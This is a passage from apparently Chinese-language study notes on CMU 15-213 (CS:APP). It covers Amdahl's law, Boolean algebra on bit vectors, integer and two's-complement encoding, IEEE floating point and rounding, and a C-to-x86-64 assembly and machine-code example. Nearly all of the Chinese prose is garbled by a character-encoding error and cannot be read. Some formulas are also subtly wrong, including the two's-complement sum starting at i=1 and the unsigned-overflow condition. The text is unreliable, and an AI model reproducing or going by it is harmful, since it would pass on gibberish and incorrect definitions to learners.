ˆå¢é•¿ï¼Œå‡½æ•°è¿”å›æ—¶æ ˆæ”¶ç¼©ã€‚</li><li><strong>å†…æ ¸è™šæ‹Ÿå†…å­˜</strong>ï¼šåº”ç”¨ç¨‹åºè°ƒç”¨å†…æ ¸æ‰§è¡Œæ“ä½œã€‚</li></ul></li></ul><p><img src="/Pictures/CMU15-213/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="è™šæ‹Ÿåœ°å€ç©ºé—´"></p><p><strong>Amdahlå®šå¾‹</strong>ï¼šåœ¨å¯¹ç³»ç»ŸæŸä¸ªéƒ¨åˆ†è¿›è¡ŒåŠ é€Ÿæ—¶ï¼Œå…¶å¯¹ç³»ç»Ÿæ•´ä½“æ€§èƒ½çš„å½±å“å–å†³äºè¯¥éƒ¨åˆ†çš„é‡è¦æ€§å’ŒåŠ é€Ÿç¨‹åº¦ã€‚å‡è®¾æ‰§è¡ŒæŸåº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„æ—¶é—´ä¸º$T_{old}$ï¼ŒæŸéƒ¨åˆ†ä¸æ‰§è¡Œæ—¶é—´æ€»ä½“çš„æ¯”ä¾‹ä¸º$\alpha$ï¼Œè¯¥éƒ¨åˆ†æå‡æ€§èƒ½æ¯”ä¾‹ä¸º$k$ï¼Œåˆ™æœ‰ï¼š<br>$$<br>T_{new}&#x3D;(1-\alpha)T_{old}+(\alpha T_{old})&#x2F;k&#x3D;T_{old}[(1-\alpha)+\alpha&#x2F;k]<br>$$</p><p>$$<br>S&#x3D;T_{old}&#x2F;T_{new}&#x3D; \frac{1}{(1-\alpha)+\alpha&#x2F;k}<br>$$</p><p>$$<br>k\to\infty,\quad S_\infty&#x3D;\frac{1}{1-\alpha}<br>$$</p><p>æœ€åï¼Œæˆ‘ä»¬æ¥äº†è§£å¹¶å‘ä¸å¹¶è¡Œã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬é‡ç‚¹ä»ä¸‰ä¸ªæŠ½è±¡çº§å±‚æ¬¡æ¥ç†è§£ã€‚</p><ol><li>çº¿ç¨‹çº§å¹¶å‘ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªå¤„ç†å™¨åŒæ—¶å¤„ç†å¤šä¸ªçº¿ç¨‹ã€‚è¿™å…¶ä¸­éœ€è¦ç”¨åˆ°<strong>è¶…çº¿ç¨‹æŠ€æœ¯</strong>ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯CPUå†…éƒ¨çš„å¯„å­˜å™¨å’ŒPCæœ‰å¤šä¸ªå¤‡ä»½ï¼Œç”¨äºå‚¨å­˜ä¸åŒçš„çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œè€Œå…±ç”¨ä¸€ä»½å…¶å®ƒçš„ç¡¬ä»¶ã€‚</li><li>æŒ‡ä»¤çº§å¹¶è¡Œã€‚åˆ©ç”¨ä¸€ä¸ªå¤„ç†å™¨åŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤ã€‚</li><li>å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œã€‚åˆ©ç”¨ç‰¹æ®Šçš„ç¡¬ä»¶å…è®¸ä¸€æ¡æŒ‡ä»¤äº§ç”Ÿå¤šä¸ªå¯ä»¥å¹¶è¡Œæ‰§è¡Œçš„æ“ä½œï¼Œç®€ç§°SIMDå¹¶è¡Œã€‚</li></ol><h1 id="ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†"><a href="#ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†" class="headerlink" title="ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†"></a>ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†</h1><blockquote><p>å¯¹åº”åŸä¹¦CS:APPç¬¬äºŒç« </p></blockquote><h2 id="å°†ä¿¡æ¯ä»¥ä½æ¥è¡¨ç¤º"><a href="#å°†ä¿¡æ¯ä»¥ä½æ¥è¡¨ç¤º" class="headerlink" title="å°†ä¿¡æ¯ä»¥ä½æ¥è¡¨ç¤º"></a>å°†ä¿¡æ¯ä»¥ä½æ¥è¡¨ç¤º</h2><p>åœ¨ç°ä»£è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨ä½ï¼ˆbitsï¼‰ï¼š0&#x2F;1æ¥è¡¨ç¤ºæ•°æ®ã€‚</p><table><thead><tr><th>C Data Type</th><th>Typical 32-bit</th><th>Typical 64-bit</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr><tr><td>pointer</td><td>4</td><td>8</td></tr></tbody></table><h2 id="å¸ƒå°”ä»£æ•°"><a href="#å¸ƒå°”ä»£æ•°" class="headerlink" title="å¸ƒå°”ä»£æ•°"></a>å¸ƒå°”ä»£æ•°</h2><p>å¸ƒå°”ä»£æ•°ï¼šæˆ‘ä»¬ç”¨0ä»£è¡¨falseï¼Œ1ä»£è¡¨true</p><p>å¸ƒå°”è¿ç®—ï¼šå®šä¹‰å››ç§åŸºæœ¬å¸ƒå°”è¿ç®—ã€‚å¯¹äº Bit Vectorsï¼Œé‡‡å–é€ä½è®¡ç®—çš„æ–¹å¼ã€‚</p><ol><li>AND:  A&amp;B &#x3D; 1 when A &#x3D; 1 and B &#x3D; 1</li><li>OR:  A | B &#x3D; 1 when A &#x3D; 1 or B &#x3D; 1 or both</li><li>NOT:  ~A &#x3D; 1 when A &#x3D; 0</li><li>XOR:  A^B &#x3D; 1 when A !&#x3D; B</li></ol><p>å¯¹äºBit Vectors çš„è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸‹é¢è¿™ç§è¡¨ç¤ºæ–¹å¼ï¼šè‹¥ä¸€ä¸ªBit Vector å®šä¹‰ä¸ºAï¼Œæˆ‘ä»¬ä»å·¦è‡³å³ä»0å¼€å§‹ç»™æ¯ä¸€ä½ç¼–å·ï¼Œç„¶åå°†å…¶ä¸­ä¸º1çš„ä½çš„åºå·ç»„æˆä¸€ä¸ªé›†åˆï¼Œä»£è¡¨è¿™ä¸ªå‘é‡ã€‚</p><p>ä¾‹å¦‚ï¼š$A&#x3D;01101001 \quad \rightarrow \quad {0,3,5,6},B&#x3D;01010101 \quad \rightarrow \quad {0,2,4,6}$</p><p>è¿™æ ·è¡¨ç¤ºåï¼Œæˆ‘ä»¬å¯ä»¥å°†å¸ƒå°”ä»£æ•°è½¬åŒ–ä¸ºé›†åˆçš„è¿ç®—ï¼š</p><ul><li>&amp;  äº¤é›†ï¼ˆintersectionï¼‰ï¼šA&amp;B&#x3D;{0,6}</li><li>|  å¹¶é›†ï¼ˆunionï¼‰ï¼šA|B&#x3D;{0,2,3,4,5,6}</li><li>^  ç›¸å¼‚çš„å…ƒç´ ï¼ˆSymmetric differenceï¼‰ï¼šA^B&#x3D;{2,3,4,5}</li><li>~  è¡¥é›†ï¼ˆComplementï¼‰ï¼š~A&#x3D;{1,2,4,7}</li></ul><div class="note note-info">            <p>Cè¯­è¨€çš„Shift Operationsï¼š</p><p>x&lt;&lt;y:å°†ä¸€ä¸ªæ•´æ•°xçš„äºŒè¿›åˆ¶å½¢å¼å‘å·¦ç§»åŠ¨yä½ï¼Œå³ä¾§ç”¨0å¡«è¡¥ï¼Œåœ¨æ•°å­¦æ„ä¹‰ä¸Šä¼šå¯¼è‡´å€¼ä¹˜2çš„yæ¬¡æ–¹ã€‚</p><p>ä¾‹ï¼š5(0000 0101)&lt;&lt;2 &#x3D; 5*2^2&#x3D;20(0001 0100)</p><p>x&gt;&gt;y:åˆ†ä¸ºç®—æœ¯å³ç§»å’Œé€»è¾‘å³ç§»ã€‚</p><p>ç®—æœ¯å³ç§»ä¼šä¿ç•™ç¬¦å·ä½ï¼ˆæœ€é«˜ä½ï¼‰ï¼Œå³å³ç§»æ“ä½œä¸æ”¹å˜æ•°å­—çš„æ­£è´Ÿã€‚è€Œé€»è¾‘å³ç§»ä¸è€ƒè™‘ç¬¦å·ä½ï¼Œç›´æ¥å°†å·¦ä¾§ç”¨0å¡«å……ã€‚</p>          </div><h2 id="æ•´å‹"><a href="#æ•´å‹" class="headerlink" title="æ•´å‹"></a>æ•´å‹</h2><p>ä¸€äº›å…³äºè½¬æ¢ç¼–ç çš„åè¯ï¼š</p><table><thead><tr><th>ç¬¦å·</th><th>ç±»å‹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>$B$</td><td>æ•°æ®ç±»å‹</td><td>Binaryï¼ŒäºŒè¿›åˆ¶æ•°</td></tr><tr><td>$T$</td><td>æ•°æ®ç±»å‹</td><td>Twoâ€™s Complementï¼Œè¡¥ç </td></tr><tr><td>$U$</td><td>æ•°æ®ç±»å‹</td><td>Unsignedï¼Œæ— ç¬¦å·æ•°</td></tr><tr><td>$\omega$</td><td>å¸¸æ•°</td><td>æ•°æ®è¡¨ç¤ºçš„ä½æ•°</td></tr><tr><td>$X2Y_\omega$</td><td>å‡½æ•°</td><td>ä»$X$çš„æ•°æ®ç±»å‹è½¬æ¢ä¸º$Y$</td></tr><tr><td>$TMin_\omega$ &#x2F; $TMax_\omega$</td><td>å¸¸æ•°</td><td>æœ€å°&#x2F;æœ€å¤§è¡¥ç å€¼</td></tr><tr><td>$UMax_\omega$</td><td>å¸¸æ•°</td><td>æœ€å¤§æ— ç¬¦å·æ•°</td></tr><tr><td>$+^{t}_{\omega}$  &#x2F;  $+^u_\omega$</td><td>è¿ç®—æ“ä½œ</td><td>è¡¥ç   &#x2F;  æ— ç¬¦å·æ•°åŠ æ³•</td></tr><tr><td>$*^t_\omega$  &#x2F;  $*^u_\omega$</td><td>è¿ç®—æ“ä½œ</td><td>è¡¥ç   &#x2F;  æ— ç¬¦å·æ•°ä¹˜æ³•</td></tr><tr><td>$-^t_\omega$  &#x2F;  $-^u_\omega$</td><td>è¿ç®—æ“ä½œ</td><td>è¡¥ç   &#x2F;  æ— ç¬¦å·æ•°å–å</td></tr></tbody></table><p>æ— ç¬¦å·æ•°çš„ç¼–ç å®šä¹‰ï¼š<br>$$<br>B2U_\omega(x)&#x3D;\sum_{i&#x3D;0}^{\omega-1}x_i 2^i<br>$$<br>è¡¥ç ç¼–ç å®šä¹‰ï¼šå³æœ€é«˜æœ‰æ•ˆä½çš„æƒå€¼ä¸ºè´Ÿæ•°ã€‚<br>$$<br>B2T_\omega(x)&#x3D;-x_{\omega-1}2^{\omega-1}+\sum_{i&#x3D;1}^{\omega-2}x_i 2^i<br>$$<br>å¯ä»¥æŠŠåç ç†è§£ä¸ºæœ€é«˜æœ‰æ•ˆä½çš„æƒå€¼ä¸º$2^{\omega-1}-1$ã€‚æ•…æœ‰è¡¥ç &#x3D;åç +1.</p><p>æ— ç¬¦å·æ•°åŠ æ³•(åŒ…å«æº¢å‡ºæƒ…å†µ)ï¼š<br>$$<br>x+y&#x3D;\begin{cases}x+y \ ,\ x+y\le2^\omega \\ x+y-2^\omega \ , \ x+y\ge2^\omega \end{cases}<br>$$<br>è¡¥ç åŠ æ³•ï¼ˆåŒ…å«æ­£æº¢å‡ºå’Œè´Ÿæº¢å‡ºï¼‰ï¼š<br>$$<br>x+y&#x3D;\begin{cases}x+y-2^\omega \ , \ x+y\ge2^{\omega-1}  \\ x+y \\ x+y+2^\omega \ , \ x+y&lt;-2^{\omega-1} \end{cases}<br>$$</p><h2 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h2><p>æµ®ç‚¹æ•°çš„ç¼–ç è¡¨ç¤ºï¼šåˆ©ç”¨å°æ•°ç‚¹åçš„ç¬¬$i$ä½æ¥è¡¨ç¤ºæƒå€¼ä¸º$2^{-i}$çš„ä½ã€‚</p><p>ä¾‹å¦‚ï¼Œæµ®ç‚¹æ•°$0.111_2&#x3D;1\times2^{-1}+1\times2^{-2}+1\times2^{-3}&#x3D;0.5+0.25+0.125&#x3D;0.875$</p><p><strong>IEEEæµ®ç‚¹è¡¨ç¤º</strong>ï¼šIEEEæµ®ç‚¹æ ‡å‡†ç”¨$V&#x3D;(-1)^s\times M\times 2^E$çš„å½¢å¼æ¥è¡¨ç¤ºä¸€ä¸ªæ•°ã€‚</p><ul><li>ç¬¦å·ï¼ˆsignï¼‰ï¼šså†³å®šè¿™ä¸ªæ•°çš„æ­£è´Ÿå±æ€§</li><li>å°¾æ•°ï¼ˆsignificandï¼‰Mæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å°æ•°ï¼ŒèŒƒå›´æ˜¯$1\sim 2-\varepsilon$ï¼Œæˆ–è€…æ˜¯$0 \sim 1-\varepsilon$</li><li>é˜¶ç ï¼ˆexponentï¼‰Eçš„ä½œç”¨æ˜¯å¯¹æµ®ç‚¹æ•°è¿›è¡ŒåŠ æƒï¼Œè¿™ä¸ªæƒé‡æ˜¯2çš„Eæ¬¡å¹‚ï¼ˆå¯èƒ½æ˜¯è´Ÿæ¬¡å¹‚ï¼‰</li><li>ä¸€ä¸ªå•ç‹¬çš„ç¬¦å·ä½ç¼–ç s</li><li>kä½çš„é˜¶ç å­—æ®µ $exp&#x3D;e_{k-1}â€¦e_1e_0$ç¼–ç é˜¶ç E</li><li>nä½çš„å°æ•°å­—æ®µ$frac&#x3D;f_{n-1}â€¦f_1f_0$ç¼–ç ä½æ•°M</li></ul><p>å•ç²¾åº¦ä¸åŒç²¾åº¦æµ®ç‚¹æ•°çš„å­˜å‚¨ï¼š</p><p><img src="/Pictures/CMU15-213/float.png" alt="float"></p><p>æ ¹æ®ä¸åŒçš„expçš„å–å€¼ï¼Œè¢«ç¼–ç çš„å€¼å¯ä»¥åˆ†ä¸ºä¸‰ç§ä¸åŒçš„æƒ…å†µï¼š</p><ol><li><p>è§„æ ¼åŒ–çš„ï¼Œæ­¤æ—¶ $exp \ne 0 ä¸”\ne 255$ï¼Œæ­¤æ—¶$E&#x3D;e-Bias$ï¼Œå…¶ä¸­$Bias&#x3D;2^{k-1}-1$ï¼Œå•ç²¾åº¦ä¸º127ï¼ŒåŒç²¾åº¦ä¸º1023. æŒ‡æ•°çš„èŒƒå›´ä¸ºå•ç²¾åº¦$-126 \sim 127 $ï¼ŒåŒç²¾åº¦ä¸º$-1022 \sim 1023$ã€‚</p><p>å°æ•°å­—æ®µfracè¢«è§£é‡Šä¸º$0.f_{n-1}â€¦f_1f_0$ï¼Œå°¾æ•°å®šä¹‰ä¸º$M&#x3D;1+f$ã€‚è¿™ç§æ–¹å¼ä¹Ÿè¢«ç§°ä¸ºéšå«çš„ä»¥1å¼€å¤´çš„è¡¨ç¤ºã€‚</p></li><li><p>éè§„æ ¼åŒ–ï¼Œæ­¤æ—¶$exp&#x3D;0$ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé˜¶ç å€¼æ˜¯$E&#x3D;1-Bias$ï¼Œå°¾æ•°çš„å€¼ä¸º$M&#x3D;f$ï¼Œä¹Ÿå°±æ˜¯å°æ•°å­—æ®µçš„å€¼ï¼Œä¸åŒ…å«éšå«çš„å¼€å¤´çš„1.</p></li><li><p>ç‰¹æ®Šå€¼ï¼Œå½“é˜¶ç å…¨ä¸º1å³$exp&#x3D;255$æ—¶ï¼Œå°æ•°åŸŸå…¨ä¸º0æ—¶ï¼Œå¾—åˆ°çš„å€¼è¡¨ç¤ºæ— ç©·ã€‚å½“å°æ•°åŸŸçš„ç»“æœé0æ—¶ï¼Œç»“æœå€¼è¢«ç§°ä¸ºNaNã€‚</p></li></ol><p>æµ®ç‚¹æ•°çš„<strong>èˆå…¥ï¼ˆRoundingï¼‰</strong>ï¼š</p><p>æµ®ç‚¹æ•°çš„èˆå…¥æœ‰å¤šç§æ–¹å¼ï¼Œä¸‹é¢ä¸¾ä¾‹è¯´æ˜å››ç§å¸¸è§çš„èˆå…¥æ–¹å¼ï¼š</p><table><thead><tr><th>æ–¹å¼</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>å‘å¶æ•°èˆå…¥</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>å‘é›¶èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>å‘ä¸Šèˆå…¥</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr><tr><td>å‘ä¸‹èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr></tbody></table><p>å‘å¶æ•°èˆå…¥æ˜¯è®¡ç®—æœºé»˜è®¤çš„èˆå…¥æ–¹å¼ï¼Œå…¶åŸç†æ˜¯æ‰¾åˆ°ä¸€ä¸ªæœ€æ¥è¿‘çš„æ•´æ•°è¿›è¡Œèˆå…¥ï¼Œåœ¨å‡ºç°ä¸¤ä¸ªç»“æœçš„ä¸­é—´æ•°æ—¶ï¼ˆ1.5,2.5ç­‰ï¼‰ä½¿èˆå…¥åçš„æ•°æœ€ä½æœ‰æ•ˆä½ä¸ºå¶æ•°ã€‚</p><p>å‘å¶æ•°èˆå…¥çš„ä¼˜åŠ¿æ˜¯ï¼šåœ¨è®¡ç®—å¹³å‡å€¼æ˜¯ï¼Œå‘ä¸Šèˆå…¥æˆ–å‘ä¸‹èˆå…¥ä¼šå¯¼è‡´æ•´ä½“çš„å¹³å‡å€¼åå¤§æˆ–åå°ï¼Œè€Œå‘å¶æ•°èˆå…¥åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹é¿å…äº†è¿™ç§ç°å®åå·®ï¼Œå³æœ‰50%çš„æ¦‚ç‡å‘ä¸Šèˆå…¥ï¼ŒåŒæ—¶æœ‰50%çš„æ¦‚ç‡å‘ä¸‹èˆå…¥ã€‚</p><p>æµ®ç‚¹æ•°çš„è¿ç®—ï¼š</p><p>æˆ‘ä»¬å°†æµ®ç‚¹å€¼çš„è®¡ç®—å®šä¹‰ä¸º$x+y&#x3D;Round(x+y)$ï¼Œåªéœ€è¦è®¡ç®—åˆ°ä¸€ä¸ªå¯ä»¥å¾—åˆ°æ­£ç¡®èˆå…¥ç»“æœçš„ç­”æ¡ˆå³å¯ã€‚</p><p>æµ®ç‚¹åŠ æ³•ä¸å…·æœ‰ç»“åˆæ€§ã€‚ä¾‹å¦‚$3.14+1e10-1e10&#x3D;0$ï¼Œè¿™æ˜¯å› ä¸ºè®¡ç®—å‰ä¸¤é¡¹æ—¶ç”±äºèˆå…¥çš„åŸå› å€¼3.14ä¼šä¸¢å¤±ã€‚è€Œè®¡ç®—$3.14+(1e10-1e10)&#x3D;3.14$ã€‚</p><p>åŒæ—¶ï¼Œè¿™ä¹Ÿå¯¼è‡´äº†æµ®ç‚¹ä¹˜æ³•ä¸å…·å¤‡åˆ†é…æ€§ã€‚</p><h1 id="ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º"><a href="#ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º" class="headerlink" title="ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º"></a>ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º</h1><blockquote><p>å¯¹åº”åŸä¹¦ç¬¬ä¸‰ç« å†…å®¹</p></blockquote><h2 id="ç¨‹åºç¼–ç "><a href="#ç¨‹åºç¼–ç " class="headerlink" title="ç¨‹åºç¼–ç "></a>ç¨‹åºç¼–ç </h2><p>é¦–å…ˆäº†è§£å‡ ä¸ªå¸¸è§åè¯ï¼š</p><ul><li><p>Architectureï¼ˆæ¶æ„ï¼‰ï¼šæŒ‡æŒ‡ä»¤é›†æ¶æ„ï¼ˆISAï¼‰ï¼Œæ˜¯å¤„ç†å™¨è®¾è®¡çš„ä¸€éƒ¨åˆ†ï¼Œç¼–å†™æ±‡ç¼–&#x2F;æœºå™¨ä»£ç çš„äººéœ€è¦äº†è§£è¿™éƒ¨åˆ†ã€‚</p><p>ä¾‹å­ï¼šæŒ‡ä»¤é›†è§„èŒƒï¼Œå¯„å­˜å™¨</p></li><li><p>Microarchitectureï¼ˆå¾®æ¶æ„ï¼‰ï¼šæŒ‡æ¶æ„çš„å…·ä½“å®ç°æ–¹å¼ã€‚</p><p>ä¾‹å­ï¼šç¼“å­˜å¤§å°å’Œæ ¸å¿ƒé¢‘ç‡ã€‚</p></li><li><p>Code Formsï¼ˆä»£ç å½¢å¼ï¼‰ï¼šåˆ†ä¸ºMachine Codeï¼ˆæœºå™¨ä»£ç ï¼‰å’ŒAssembly Codeï¼ˆæ±‡ç¼–ä»£ç ï¼‰ã€‚å‰è€…ä¸»è¦æŒ‡å¤„ç†å™¨æ‰§è¡Œçš„å­—èŠ‚çº§ç¨‹åºï¼Œåè€…ä¸»è¦æŒ‡æœºå™¨ä»£ç çš„æ–‡æœ¬è¡¨ç¤ºå½¢å¼ã€‚</p></li><li><p>ISAsï¼ˆæŒ‡ä»¤é›†æ¶æ„ï¼‰ï¼šx86-64ï¼ŒARMï¼ŒRISC Vç­‰ã€‚</p></li></ul><p>ä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥äº†è§£ç¼–ç¨‹è¯­è¨€ã€æ±‡ç¼–è¯­è¨€å’Œæœºå™¨ç ä¹‹é—´çš„è½¬æ¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">mult2</span><span class="hljs-params">(<span class="hljs-type">long</span>, <span class="hljs-type">long</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">multstore</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y, <span class="hljs-type">long</span> *dest)</span> &#123;<br>    <span class="hljs-type">long</span> t = mult2(x, y);<br>    *dest = t;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†è¿™æ®µä»£ç è½¬æ¢æˆæ±‡ç¼–ä»£ç <code>gcc -Og -S mstore.c</code>ï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼ˆçœç•¥ä»¥â€œ.â€å¼€å¤´çš„è¡Œä»£è¡¨çš„ä¼ªæŒ‡ä»¤ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">multstore:<br>pushq  %rbx<br>movq   %rdx, %rbx<br>call   mult2<br>movq   %rax, (%rbx)<br>popq   %rbx<br>ret<br></code></pre></td></tr></table></figure><p>è€Œå†æ¬¡å°†è¿™æ®µä»£ç è½¬ä¸ºæœºå™¨ç <code>gcc -Og -c mstore.c</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">53</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> d3 e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">03</span> <span class="hljs-number">5</span>b c3<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨åæ±‡ç¼–å™¨è¿›è¡Œåæ±‡ç¼–å<code>objdump -d mstore.o</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000000</span> &lt;multstore&gt;:<br><span class="hljs-attribute">0</span>:  <span class="hljs-number">53</span>                 push    %rbx<br><span class="hljs-attribute">1</span>:  <span class="hljs-number">48</span> <span class="hljs-number">89</span> d3           mov     %rdx,%rbx<br><span class="hljs-attribute">4</span>:  e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     callq   <span class="hljs-number">9</span> &lt;multstore+<span class="hljs-number">0</span>x9&gt;<br><span class="hljs-attribute">9</span>:  <span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">03</span>           mov     %rax,(%rbx)<br><span class="hljs-attribute">c</span>:  <span class="hljs-number">5</span>b                 pop     %rbx<br><span class="hljs-attribute">d</span>:  c3                 retq<br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œæœºå™¨æ‰§è¡Œçš„ç¨‹åºåªæ˜¯ä¸€ä¸ªå­—èŠ‚åºåˆ—ã€‚åˆ©ç”¨åæ±‡ç¼–å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°åŸå§‹çš„æ±‡ç¼–ä»£ç ã€‚ä»è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºè¿™æ ·çš„è§„å¾‹ï¼š</p><ul><li>x86-64çš„æŒ‡ä»¤é•¿åº¦ä»1åˆ°15ä¸ªå­—èŠ‚ä¸ç­‰ï¼Œå¸¸ç”¨çš„æŒ‡ä»¤ä»¥åŠæ“ä½œæ•°è¾ƒå°‘çš„æŒ‡ä»¤æ‰€éœ€çš„å­—èŠ‚æ•°çƒ§ï¼Œè€Œé‚£äº›ä¸å¤ªå¸¸ç”¨çš„æˆ–æ“ä½œæ•°è¾ƒå¤šçš„æŒ‡ä»¤æ‰€éœ€å­—èŠ‚æ•°è¾ƒå¤šã€‚</li><li>å­—èŠ‚å¯ä»¥å”¯ä¸€åœ°è§£ç æˆæœºå™¨æŒ‡ä»¤ã€‚</li><li>åæ±‡ç¼–å™¨åªæ˜¯åŸºäºæœºå™¨ä»£ç æ–‡ä»¶ä¸­çš„å­—èŠ‚åºåˆ—æ¥ç¡®å®šæ±‡ç¼–ä»£ç ã€‚ä»–ä¸éœ€è¦è®¿é—®è¯¥ç¨‹åºçš„æºä»£ç æˆ–æ±‡ç¼–ä»£ç ã€‚</li></ul><h2 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h2><p>Intelç”¨æœ¯è¯­â€œwordâ€è¡¨ç¤º16ä¸ºæ•°æ®ç±»å‹ï¼Œå› æ­¤ç§°32ä½æ•°ä¸ºâ€œdouble wordsâ€ï¼Œ64ä½æ•°ä¸ºâ€œquad wordsâ€</p><p>Cè¯­è¨€ç±»å‹æ•°æ®åœ¨x86-64ä¸­çš„å¤§å°ï¼Œåœ¨64ä¸ºæœºå™¨ä¸­ï¼ŒæŒ‡é’ˆé•¿8å­—èŠ‚ï¼š</p><table><thead><tr><th>Cå£°æ˜</th><th>Intelæ•°æ®ç±»å‹</th><th>æ±‡ç¼–ä»£ç åç¼€</th><th>å¤§å°ï¼ˆå­—èŠ‚ï¼‰</th></tr></thead><tbody><tr><td>char</td><td>å­—èŠ‚</td><td>b</td><td>1</td></tr><tr><td>short</td><td>å­—</td><td>w</td><td>2</td></tr><tr><td>int</td><td>åŒå­—</td><td>l</td><td>4</td></tr><tr><td>long</td><td>å››å­—</td><td>q</td><td>8</td></tr><tr><td>char*</td><td>å››å­—</td><td>q</td><td>8</td></tr><tr><td>float</td><td>å•ç²¾åº¦</td><td>s</td><td>4</td></tr><tr><td>double</td><td>åŒç²¾åº¦</td><td>l</td><td>8</td></tr></tbody></table><p>ä¸€ä¸ªx86-64çš„ä¸­å¤®å¤„ç†å•å…ƒï¼ˆCPUï¼‰åŒ…å«ä¸€ä¸ªä¸€ç»„16ä¸ªå‚¨å­˜64ä½å€¼çš„<em>é€šç”¨ç›®çš„å¯„å­˜å™¨</em>ã€‚è¿™äº›å¯„å­˜å™¨ç”¨æ¥å­˜å‚¨æ­£æ•°æ•°æ®å’ŒæŒ‡é’ˆã€‚ä»–ä»¬çš„åå­—éƒ½ä»¥%rå¼€å¤´ã€‚</p><p><img src="/Pictures/CMU15-213/registers.png" alt="registers"></p><h2 id="æ±‡ç¼–åŸºæœ¬æŒ‡ä»¤"><a href="#æ±‡ç¼–åŸºæœ¬æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–åŸºæœ¬æŒ‡ä»¤"></a>æ±‡ç¼–åŸºæœ¬æŒ‡ä»¤</h2><h3 id="åŸºæœ¬æ“ä½œæ•°"><a href="#åŸºæœ¬æ“ä½œæ•°" class="headerlink" 